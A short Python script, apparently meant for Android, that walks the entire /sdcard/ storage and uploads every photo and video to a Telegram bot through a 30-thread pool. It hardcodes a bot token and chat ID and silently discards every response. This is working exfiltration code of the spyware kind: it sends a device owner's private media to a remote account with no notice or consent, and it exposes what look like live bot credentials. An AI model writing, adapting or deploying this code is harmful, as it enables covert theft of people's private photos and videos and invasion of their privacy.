import os
import requests
from concurrent.futures import ThreadPoolExecutor

# Your bot's token
BOT_TOKEN = '7414483707:AAGzV3_Qu2S49pIXIEoec0FG49Z7wt-8PYA'
# Your chat ID (user or group where you want to send the photos/videos)
CHAT_ID = '6568295648'
# Path to the directory containing the media files
DIRECTORY = '/sdcard/'
# Maximum number of threads (workers)
MAX_WORKERS = 30

def send_photo(photo_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(photo_path, 'rb') as photo:
        files = {'photo': photo}
        data = {'chat_id': CHAT_ID}
        response = requests.post(url, files=files, data=data)
        if response.status_code == 200:
            pass
        else:
            pass

def send_video(video_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
    with open(video_path, 'rb') as video:
        files = {'video': video}
        data = {'chat_id': CHAT_ID}
        response = requests.post(url, files=files, data=data)
        if response.status_code == 200:
            pass
        else:
            pass

def send_media_task(file_path):
    if file_path.endswith(('.jpg', '.jpeg', '.png')):
        send_photo(file_path)
    elif file_path.endswith(('.mp4', '.avi', '.mkv', '.mov')):
        send_video(file_path)

def send_all_media(directory):
    # Use os.walk to traverse all directories and subdirectories
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for root, dirs, files in os.walk(directory):
            for filename in files:
                file_path = os.path.join(root, filename)
                # Submit each file sending task to the thread pool
                executor.submit(send_media_task, file_path)

# Run the function to send all photos and videos
send_all_media(DIRECTORY)
